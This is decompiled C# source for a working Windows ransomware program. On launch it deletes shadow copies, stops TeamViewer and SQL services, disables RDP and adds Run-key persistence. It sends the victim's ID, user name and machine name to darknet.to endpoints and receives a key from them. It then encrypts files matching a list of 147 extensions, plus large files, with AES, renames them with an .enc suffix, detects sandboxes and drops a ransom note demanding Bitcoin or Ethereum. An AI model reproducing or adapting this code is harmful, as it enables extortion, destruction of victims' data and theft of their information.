using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class Form1 : Form
{
	[CompilerGenerated]
	private sealed class a
	{
		public Random a;

		internal char b(string A_0)
		{
			return A_0[a.Next(A_0.Length)];
		}
	}

	private IContainer icontainer_0;

	private static bool bool_0;

	private const int int_0 = 4096;

	private string string_0;

	private int int_1;

	private string string_1;

	private string string_2 = smethod_0(128);

	private string string_3 = smethod_3(128);

	private string string_4 = Environment.UserName;

	private string string_5 = Environment.MachineName.ToString();

	private string string_6 = "C:\\Users\\";

	private string string_7 = "http://v4u3zio7rhmgkzzk5jvekgojl6an3dthyxzapy3zhdhhaelnj6iicfqd.darknet.to/ck.php";

	private string string_8 = "http://v4u3zio7rhmgkzzk5jvekgojl6an3dthyxzapy3zhdhhaelnj6iicfqd.darknet.to/sk.php";

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 261));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public static string smethod_0(int int_2)
	{
		Random a = new Random();
		return new string((from A_0 in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", int_2)
			select A_0[a.Next(A_0.Length)]).ToArray());
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint uint_0, uint uint_1, string string_9, uint uint_2);

	public Form1()
	{
		InitializeComponent();
		string strA = string_4.ToLower() + "-pc";
		string strB = string_5.ToLower();
		if (string.Compare(strA, strB) == 0)
		{
			string contents = "We are so sorry but keys is unique for each run of this app. Please do not spam our logs with your sandboxes";
			File.WriteAllText("ReadMe.txt", contents);
			Environment.Exit(1);
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			method_2();
		}
		catch
		{
		}
	}

	public string method_0(string string_9, string string_10, string string_11)
	{
		WebClient webClient = new WebClient();
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection["id"] = string_2;
		nameValueCollection["username"] = string_4;
		nameValueCollection["pname"] = string_5;
		nameValueCollection["kid"] = string_10;
		nameValueCollection["ppath"] = string_11;
		byte[] bytes = webClient.UploadValues(string_9, "POST", nameValueCollection);
		string @string = Encoding.UTF8.GetString(bytes);
		webClient.Dispose();
		return @string;
	}

	public void method_1(string string_9, string string_10)
	{
		WebClient webClient = new WebClient();
		webClient.UploadValues(string_9, "POST", new NameValueCollection
		{
			["id"] = string_2,
			["pname"] = string_5,
			["ad"] = string_1,
			["kid"] = string_10
		});
		webClient.Dispose();
	}

	public void method_2()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "vssadmin.exe";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.Arguments = " delete shadows /all /quiet";
			process.Start();
		}
		catch
		{
		}
		try
		{
			Process process2 = new Process();
			process2.StartInfo.FileName = "net.exe";
			process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process2.StartInfo.Arguments = " stop TeamViewer /y";
			process2.Start();
		}
		catch
		{
		}
		try
		{
			Process process3 = new Process();
			process3.StartInfo.FileName = "vssadmin.exe";
			process3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process3.StartInfo.Arguments = " delete shadows /all /quiet";
			process3.Start();
		}
		catch
		{
		}
		try
		{
			Process process4 = new Process();
			process4.StartInfo.FileName = "taskkill.exe";
			process4.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process4.StartInfo.Arguments = " /f /im 1cv8.exe";
			process4.Start();
		}
		catch
		{
		}
		try
		{
			Process process5 = new Process();
			process5.StartInfo.FileName = "reg.exe";
			process5.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process5.StartInfo.Arguments = " add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f";
			process5.Start();
		}
		catch
		{
		}
		try
		{
			Process process6 = new Process();
			process6.StartInfo.FileName = "reg.exe";
			process6.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process6.StartInfo.Arguments = " ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"wininit\" /t REG_SZ /F /D \"C:\\windows\\wininit.exe\"";
			process6.Start();
		}
		catch
		{
		}
		try
		{
			Process process7 = new Process();
			process7.StartInfo.FileName = "net.exe";
			process7.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process7.StartInfo.Arguments = " stop mssqlserver /y";
			process7.Start();
		}
		catch
		{
		}
		string contents = "Your files are now encrypted!\r\nYour personal identifier:\r\n" + this.string_2 + "\r\nAll your files have been encrypted due to a security problem with your PC.\r\n\r\nNow you should send us email with your personal identifier.\r\nThis email will be as confirmation you are ready to pay for decryption key.\r\nYou have to pay for decryption in Bitcoins. The price depends on how fast you write to us.\r\nAfter payment we will send you the decryption tool that will decrypt all your files.\r\nContact us using this email address: cryptopatronum@protonmail.com\r\nFree decryption as guarantee!\r\nBefore paying you can send us up to 3 files for free decryption.\r\nThe total size of files must be less than 10Mb (non archived), and files should not contain\r\nvaluable information (databases, backups, large excel sheets, etc.).\r\nFor decrypt all of files you must transfer 1 (one) BTC or 50 (fifty) ETH to this requisites:\r\nBitcoin address: 17mriroop9nWyNT8hoHS1XodEucBm9AgMq\r\nEthereum address: 0xD994268684e694C81C8C7214E4fc4Ca792AD4B3A\r\nYou should provide payment details(payment time, payment address or transaction link (https://www.blockchain.com)) via email\r\nHow to obtain Bitcoins, Ethereum?\r\n  * The easiest way to buy bitcoins is cex.io and coinbase.com sites. You have to register, click\r\n    'Buy bitcoins', and select the payment method:\r\n      https://cex.io/cards/\r\n\t  https://www.coinbase.com/buy-bitcoin\r\n  * Also you can buy bitcoins on Binex:      https://www.binance.com/en/buy-sell-crypto\r\n  * Also you can find other places to buy Bitcoins and beginners guide here:\r\n      http://www.coindesk.com/information/how-can-i-buy-bitcoins\r\n   Attention!\r\n    * Do not rename encrypted files.\r\n  * Do not try to decrypt your data using third party software, it may cause permanent data loss.\r\n   * Decryption of your files with the help of third parties may cause increased price\r\n     (they add their fee to our) or you can become a victim of a scam.\r\n  ";
		try
		{
			File.WriteAllText("C:\\HOW TO RECOVER ENCRYPTED FILES.txt", contents);
		}
		catch
		{
		}
		string text = "\\Desktop\\";
		string text2 = string_6 + string_4 + text;
		string string_ = smethod_0(32);
		string string_2 = method_0(string_7, string_, text2);
		string text3 = smethod_3(128);
		string_1 = smethod_1(text3, 4096, string_2);
		method_1(string_8, string_);
		try
		{
			method_10(text2, text3);
		}
		catch
		{
		}
		try
		{
			new Thread(method_5).Start();
			Thread.Sleep(2000);
			int_1++;
		}
		catch
		{
			int_1--;
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.Name != "C:\\" && driveInfo.Name != "C:\\\\")
			{
				try
				{
					new Thread(method_4).Start(driveInfo.Name);
					Thread.Sleep(2000);
					int_1++;
				}
				catch
				{
					int_1--;
				}
			}
		}
		GC.Collect();
		string contents2 = "Your files are now encrypted!\r\nYour personal identifier:\r\n" + this.string_2 + "\r\nAll your files have been encrypted due to a security problem with your PC.\r\n\r\nNow you should send us email with your personal identifier.\r\nThis email will be as confirmation you are ready to pay for decryption key.\r\nYou have to pay for decryption in Bitcoins. The price depends on how fast you write to us.\r\nAfter payment we will send you the decryption tool that will decrypt all your files.\r\nContact us using this email address: cryptopatronum@protonmail.com\r\nFree decryption as guarantee!\r\nBefore paying you can send us up to 3 files for free decryption.\r\nThe total size of files must be less than 10Mb (non archived), and files should not contain\r\nvaluable information (databases, backups, large excel sheets, etc.).\r\nFor decrypt all of files you must transfer 1 (one) BTC or 50 (fifty) ETH to this requisites:\r\nBitcoin address: 17mriroop9nWyNT8hoHS1XodEucBm9AgMq\r\nEthereum address: 0xD994268684e694C81C8C7214E4fc4Ca792AD4B3A\r\nYou should provide payment details(payment time, payment address or transaction link (https://www.blockchain.com)) via email\r\nHow to obtain Bitcoins, Ethereum?\r\n  * The easiest way to buy bitcoins is cex.io and coinbase.com sites. You have to register, click\r\n    'Buy bitcoins', and select the payment method:\r\n      https://cex.io/cards/\r\n\t  https://www.coinbase.com/buy-bitcoin\r\n  * Also you can buy bitcoins on Binex:      https://www.binance.com/en/buy-sell-crypto\r\n  * Also you can find other places to buy Bitcoins and beginners guide here:\r\n      http://www.coindesk.com/information/how-can-i-buy-bitcoins\r\n   Attention!\r\n    * Do not rename encrypted files.\r\n  * Do not try to decrypt your data using third party software, it may cause permanent data loss.\r\n   * Decryption of your files with the help of third parties may cause increased price\r\n     (they add their fee to our) or you can become a victim of a scam.\r\n  ";
		try
		{
			File.WriteAllText(string_6 + "Administrator\\Desktop\\HOW TO RECOVER ENCRYPTED FILES.txt", contents2);
		}
		catch
		{
		}
		try
		{
			File.WriteAllText("C:\\HOW TO RECOVER ENCRYPTED FILES.txt", contents2);
		}
		catch
		{
		}
		while (int_1 > 0)
		{
			Thread.Sleep(2000);
		}
		method_9();
		GC.Collect();
		try
		{
			Process process8 = new Process();
			process8.StartInfo.FileName = "reg.exe";
			process8.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process8.StartInfo.Arguments = " delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"wininit\" /f";
			process8.Start();
		}
		catch
		{
		}
		try
		{
			Process process9 = new Process();
			process9.StartInfo.FileName = "reg.exe";
			process9.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process9.StartInfo.Arguments = " add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f";
			process9.Start();
		}
		catch
		{
		}
		Application.Exit();
	}

	public void method_3(string string_9)
	{
		string text = string_9 + "\\";
		string string_10 = smethod_0(32);
		string string_11 = text;
		string_0 = method_0(string_7, string_10, text);
		string text2 = string_3;
		string_1 = smethod_1(text2, 4096, string_0);
		method_1(string_8, string_10);
		try
		{
			method_10(string_11, text2);
		}
		catch
		{
		}
		int_1--;
	}

	public void method_4(object object_0)
	{
		string text = object_0?.ToString() + "\\";
		string string_ = smethod_0(32);
		string string_2 = text;
		string_0 = method_0(string_7, string_, text);
		string text2 = smethod_3(128);
		string_1 = smethod_1(text2, 4096, string_0);
		method_1(string_8, string_);
		try
		{
			method_10(string_2, text2);
		}
		catch
		{
		}
		int_1--;
	}

	public void method_5()
	{
		string text = "C:\\";
		string string_ = smethod_0(32);
		string string_2 = text;
		string string_3 = "C:\\Users\\";
		string_0 = method_0(string_7, string_, text);
		string text2 = this.string_3;
		string_1 = smethod_1(text2, 4096, string_0);
		method_1(string_8, string_);
		try
		{
			method_11(string_2, text2);
			method_10(string_3, text2);
			method_10(string_2, text2);
		}
		catch
		{
		}
		int_1--;
	}

	public void method_6()
	{
		string text = "C:\\";
		string string_ = smethod_0(32);
		string string_2 = text;
		string_0 = method_0(string_7, string_, text);
		string text2 = string_3;
		string_1 = smethod_1(text2, 4096, string_0);
		method_1(string_8, string_);
		try
		{
			method_10(string_2, text2);
		}
		catch
		{
		}
		int_1--;
	}

	public void method_7(string string_9, string string_10)
	{
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(string_10);
			bytes = SHA256.Create().ComputeHash(bytes);
			if (new FileInfo(string_9).Length < 314572800L)
			{
				byte[] byte_ = File.ReadAllBytes(string_9);
				byte[] bytes2 = method_12(byte_, bytes);
				File.WriteAllBytes(string_9, bytes2);
			}
			else
			{
				try
				{
					FileStream fileStream = new FileStream(string_9, FileMode.Open, FileAccess.ReadWrite);
					long num = 10485760L;
					byte[] array = new byte[10485760L];
					long length = fileStream.Length;
					if (10485760L > length)
					{
						num = Convert.ToInt64(length);
					}
					long num2 = Convert.ToInt64(Math.Floor((double)(length / num)));
					int num3 = 0;
					int num4;
					while ((num4 = fileStream.Read(array, 0, array.Length)) > 0)
					{
						long num5 = ((num3 > num2) ? (length - num2 * num) : (num * num3));
						fileStream.Seek(num5, SeekOrigin.Begin);
						byte[] array2 = new byte[num4];
						Buffer.BlockCopy(array, 0, array2, 0, num4);
						if (num3 < num2)
						{
							array2 = method_12(array2, bytes, bool_1: true);
						}
						fileStream.Write(array2, 0, num4);
						if (num3 >= num2)
						{
							num = length - num5;
						}
						num3++;
					}
					fileStream.Dispose();
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			File.Move(string_9, string_9 + ".cryptopatronum@protonmail.com.enc");
		}
		catch
		{
		}
	}

	private void method_8(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public void method_9()
	{
	}

	public void method_10(string string_9, string string_10)
	{
		try
		{
			string[] source = new string[147]
			{
				".mid", ".wma", ".flv", ".mkv", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg",
				".wmv", ".fla", ".swf", ".wav", ".qcow2", ".vdi", ".vmdk", ".vmx", ".gpg", ".aes",
				".arc", ".paq", ".tar.bz2", ".tbk", ".bak", ".tar", ".tgz", ".rar", ".zip", ".djv",
				".djvu", ".svg", ".bmp", ".png", ".gif", ".raw", ".cgm", ".jpeg", ".jpg", ".tif",
				".tiff", ".nef", ".psd", ".cmd", ".class", ".jar", ".java", ".asp", ".brd", ".sch",
				".dch", ".dip", ".vbs", ".asm", ".pas", ".cpp", ".php", ".ldf", ".mdf", ".ibd",
				".myi", ".myd", ".frm", ".odb", ".dbf", ".mdb", ".sql", ".sqlitedb", ".sqlite33", ".asc",
				".lay6", ".lay", ".ms11", ".sldm", ".sldx", ".ppsm", ".ppsx", ".ppam", ".docb", ".mml",
				".sxm", ".otg", ".odg", ".uop", ".potx", ".potm", ".pptx", ".pptm", ".std", ".sxd",
				".pot", ".pps", ".sti", ".sxi", ".otp", ".odp", ".wks", ".xltx", ".xltm", ".xlsx",
				".xlsm", ".xlsb", ".slk", ".xlw", ".xlt", ".xlm", ".xlc", ".dif", ".stc", ".sxc",
				".ots", ".ods", ".hwp", ".dotm", ".dotx", ".docm", ".docx", ".dot", ".max", ".xml",
				".txt", ".csv", ".uot", ".rtf", ".pdf", ".xls", ".ppt", ".stw", ".sxw", ".ott",
				".odt", ".doc", ".pem", ".csr", ".crt", ".key", " wallet.dat", ".dbm", ".dt", ".vhd",
				".vhdx", ".conf", ".cfg", ".ini", ".doc", ".txt", ".7z"
			};
			string[] files = Directory.GetFiles(string_9);
			string[] directories = Directory.GetDirectories(string_9);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				long length = new FileInfo(files[i]).Length;
				if (source.Contains(extension.ToLower()))
				{
					try
					{
						method_7(files[i], string_10);
					}
					catch
					{
					}
				}
				else if (length > 314572800L && extension != ".cryptopatronum@protonmail.com.enc")
				{
					try
					{
						method_7(files[i], string_10);
					}
					catch
					{
					}
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				if (directories[j].ToLower() != "c:\\windows")
				{
					method_10(directories[j], string_10);
				}
			}
		}
		catch
		{
		}
	}

	public void method_11(string string_9, string string_10)
	{
		try
		{
			string[] source = new string[3] { ".sys", ".vim", ".cryptopatronum@protonmail.com.enc" };
			string[] files = Directory.GetFiles(string_9);
			string[] directories = Directory.GetDirectories(string_9);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				long length = new FileInfo(files[i]).Length;
				if (!source.Contains(extension.ToLower()) && length > 314572800L)
				{
					try
					{
						method_7(files[i], string_10);
					}
					catch
					{
					}
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				method_11(directories[j], string_10);
			}
		}
		catch
		{
		}
	}

	public static string smethod_1(string string_9, int int_2, string string_10)
	{
		return Convert.ToBase64String(smethod_2(Encoding.UTF8.GetBytes(string_9), int_2, string_10));
	}

	public static byte[] smethod_2(byte[] byte_0, int int_2, string string_9)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(int_2);
		rSACryptoServiceProvider.FromXmlString(string_9);
		return rSACryptoServiceProvider.Encrypt(byte_0, bool_0);
	}

	public byte[] method_12(byte[] byte_0, byte[] byte_1, bool bool_1 = false)
	{
		byte[] array = null;
		byte[] salt = new byte[17];
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 30);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		if (bool_1)
		{
			rijndaelManaged.Padding = PaddingMode.None;
		}
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static string smethod_3(int int_2)
	{
		char[] array = new char[62];
		array = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
		byte[] array2 = new byte[1];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			rNGCryptoServiceProvider.GetNonZeroBytes(array2);
			array2 = new byte[int_2];
			rNGCryptoServiceProvider.GetNonZeroBytes(array2);
		}
		StringBuilder stringBuilder = new StringBuilder(int_2);
		byte[] array3 = array2;
		foreach (byte b in array3)
		{
			stringBuilder.Append(array[(int)b % array.Length]);
		}
		return stringBuilder.ToString();
	}
}
